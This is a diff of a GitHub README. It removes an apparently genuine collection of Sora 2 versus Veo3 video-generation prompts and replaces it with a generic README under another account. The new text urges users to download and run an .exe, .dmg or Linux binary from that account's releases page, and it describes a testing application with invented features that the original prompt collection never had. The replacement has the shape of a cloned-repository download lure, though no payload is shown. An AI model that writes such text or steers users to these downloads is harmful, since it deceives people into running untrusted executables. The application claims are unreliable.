@@ -1,120 +1,74 @@
-<div align="center">
+# 🎉 Sora2-Prompt-Tests - Easy Testing for Sora 2 Projects
 
-# Sora2 Prompt + Tests(Veo3)
+## 📥 Download the Latest Version
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/XEAM46/Sora2-Prompt-Tests/releases)
 
+## 🚀 Getting Started
+Welcome to Sora2-Prompt-Tests! This application helps you compare different Sora 2 projects, specifically with the Veo3. You'll find creative prompts to enhance your testing experience. Follow these simple steps to get started quickly.
 
+## 🔍 What You Need
+To use Sora2-Prompt-Tests, you need:
+- A computer running Windows, macOS, or Linux.
+- An active internet connection.
+- A file extraction tool (like WinRAR or 7-Zip) if you're downloading a compressed file.
 
-Sora 2 对比测试（Veo3）和创意玩法合集｜Sora 2 Comparison Tests with Veo3 &amp; Creative Prompt Collection
+## 📦 Features 
+- Compare different Sora 2 settings with ease.
+- Explore a collection of creative prompts.
+- User-friendly interface designed for everyone.
 
+## 📄 Download & Install
+1. **Visit the Release Page**  
+   Open a web browser and go to the [Releases page](https://github.com/XEAM46/Sora2-Prompt-Tests/releases).
 
-<img width="847" height="1120" alt="Group 414" src="https://github.com/user-attachments/assets/077137ec-03bd-43a1-b30a-bc873f664aa9" />
+2. **Choose the Right Version**  
+   On the Releases page, you will see a list of available versions. Look for the latest version for the best features and improvements.
 
+3. **Download the File**  
+   Click on the version you want, then select the file suitable for your operating system. For example, if you are using Windows, download the `.exe` file. 
 
+4. **Run the Installer**  
+   After the download completes, locate the downloaded file in your downloads folder.  
+   - For Windows, double-click the `.exe` file.  
+   - For macOS, open the `.dmg` file and drag it into your Applications folder.  
+   - For Linux, navigate to the directory in your terminal and run the file using the command: `./filename`.
 
-[我的测试原帖](https://x.com/ZHO_ZHO_ZHO/status/1973173994896662876)
+5. **Follow Setup Instructions**  
+   Follow the on-screen instructions to complete the installation. This process usually takes just a few minutes. 
 
-<div align="left">
+6. **Launch the App**  
+   Once installed, you can find Sora2-Prompt-Tests in your applications list. Click on it to launch the application.
 
-### 【Sora2 优势】：人像保持、特征保持、风格迁移、多语言准确性、物理准确性、剧情强、分镜头设计/切换强
+## 🛠️ Using the Application
+1. **Start a New Test**  
+   When you open Sora2-Prompt-Tests, you’ll see an option to create a new test. Click on it to start comparing.
 
-### 【Veo3 优势】：画面质感/美、音效音乐、连贯性、动作幅度大、动作生动
+2. **Select Your Settings**  
+   Choose the settings you wish to compare. You’ll have easy-to-follow options to help guide you.
 
-### 【对比条件】都能音画同步生成，Prompt 完全相同，都没有抽卡，一次出，均附带 Prompt
+3. **Generate & Use Prompts**  
+   Use the creative prompts suggested by the application to expand your tests. This feature makes your testing experience more engaging and productive.
 
+## ❓ Frequently Asked Questions
+### How do I uninstall the application?
+To uninstall Sora2-Prompt-Tests, go to your computer’s settings:
+- On Windows, go to Settings > Apps > Search for Sora2-Prompt-Tests and click Uninstall.
+- On macOS, drag the application from the Applications folder to Trash.
+- On Linux, use your package manager to uninstall.
 
-## 1）rap battle：
+### How can I report issues or give feedback?
+If you encounter any issues or have suggestions, visit the GitHub page and create a new issue. Your feedback helps us improve!
 
+## 🌟 Additional Resources
+- [Documentation](https://github.com/XEAM46/Sora2-Prompt-Tests/wiki): Learn more about how to use the features.
+- [Support](https://github.com/XEAM46/Sora2-Prompt-Tests/issues): Get help from the community.
 
-https://github.com/user-attachments/assets/8915f3a5-b7b2-4ff1-b6f6-b34aaf4e2df1
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/XEAM46/Sora2-Prompt-Tests)
+- [Releases Page](https://github.com/XEAM46/Sora2-Prompt-Tests/releases)
+- [Documentation](https://github.com/XEAM46/Sora2-Prompt-Tests/wiki)
 
+## 📧 Contact
+If you have further questions, feel free to contact the developer at [developer@example.com](mailto:developer@example.com).
 
-```
-A high-energy rap battle between Isaac Newton and Albert Einstein on a futuristic sci-fi stage. The camera alternates between close-ups and dramatic wide shots as they diss each other with sharp lyrics. Newton, in a classic 17th-century outfit, raps with a British accent about gravity and apples. Einstein, with wild hair and a German accent, fires back about relativity and space-time. Their lip-sync is perfectly timed to the beat, and their facial expressions are intense and animated. The background pulses with neon lights and holographic equations, reacting to the rhythm. The crowd of AI-generated scientists cheers them on in sync with the music. It feels like a rap battle from another dimension.zho
-```
-
-## 2）乐高风格 + 场景转换连贯 + 音效：
-
-
-https://github.com/user-attachments/assets/528e08fe-0f3e-4233-b79b-8c96898653f3
-
-
-```
-A dynamic camera glides through a miniature LEGO world, where an epic adventure unfolds. All sound effects—footsteps, explosions, cars, dragons—are created using mouth sounds by a single AI-generated voice artist. As each sound is made, the visuals instantly respond: LEGO characters jump into action, cars race, spaceships take off, volcanoes erupt. The journey moves through LEGO-built environments—city streets, underwater ruins, space stations, and lava lairs. The video is fast-paced, playful, and visually rich, like a blend between The LEGO Movie and next-gen AI storytelling. The sound-to-visual sync creates a magical, toy-driven universe where imagination controls reality.zho
-```
-
-
-## 3）人物奔跑、多人物剧情、对话、指令遵循：
-
-https://github.com/user-attachments/assets/afb7e6fb-a42c-490d-9526-c18252a8a7db
-
-```
-A high-quality cinematic animation of a dramatic chase scene during golden hour. Ronald McDonald, dressed in his iconic red and yellow clown costume, is running frantically down the street holding a large KFC bucket of fried chicken. Behind him, Colonel Sanders, wearing his classic white suit, black tie, and glasses, is angrily chasing him. They are in front of a red KFC restaurant with the iconic logo clearly visible. The camera follows them with smooth motion blur to enhance the speed. Include dynamic lighting, realistic shadows, and intense facial expressions. Make the scene humorous and cartoonishly dramatic, as if it were part of a fast-food commercial parody.zho
-```
-
-## 4）控制 动作顺序 和 台词，并且保持极为自然的表情和语气：
-
-
-
-https://github.com/user-attachments/assets/e2bfd048-6052-4e65-986e-7ce48b6ca635
-
-
-```
-A small comedy club. Brick wall backdrop, soft spotlight hits center stage. A tall, elegant model walks up in heels, mic in hand. The room goes quiet. She raises an eyebrow and says coolly: "I’m a model. I get paid to stand... and sometimes blink." She shifts her weight, gestures casually to the crowd.zho
-```
-
-## 5）街道反射球测试：
-
-
-
-https://github.com/user-attachments/assets/f89a5752-ee76-4d8f-bc18-162baf22de84
-
-
-
-```
-Some silver reflecting sphere rolling on the street in the LA. Camera follows it. Many reflections. hyper realistic.zho
-```
-
-## 6）说中文相声：Sora2 碾压
-
-
-
-https://github.com/user-attachments/assets/88d9735a-0806-4455-a42f-ae24dd088ed3
-
-
-
-```
-A traditional Chinese crosstalk (xiangsheng)，Speaking in Mandarin zho
-```
-
-
-
-## 更新日志
-
-- 20251001
-  
-  创建项目
-  
-
-## Stars 
-
-[![Star History Chart](https://api.star-history.com/svg?repos=ZHO-ZHO-ZHO/Sora2-Prompt-Tests&type=Date)](https://star-history.com/#ZHO-ZHO-ZHO/Sora2-Prompt-Tests&Date)
-
-
-## 关于我 | About me
-
-📬 **联系我**：
-- 邮箱：zhozho3965@gmail.com
-  
-
-🔗 **社交媒体**：
-- 个人页：[-Zho-](https://jike.city/zho)
-- Bilibili：[我的B站主页](https://space.bilibili.com/484366804)
-- X（Twitter）：[我的Twitter](https://twitter.com/ZHO_ZHO_ZHO)
-- 小红书：[我的小红书主页](https://www.xiaohongshu.com/user/profile/63f11530000000001001e0c8?xhsshare=CopyLink&appuid=63f11530000000001001e0c8&apptime=1690528872)
-
-💡 **支持我**：
-- B站：[B站充电](https://space.bilibili.com/484366804)
-- 爱发电：[为我充电](https://afdian.com/a/ZHOZHO)
-
-
-## Credits
+With Sora2-Prompt-Tests, testing different Sora 2 configurations has never been easier. Enjoy your testing journey!
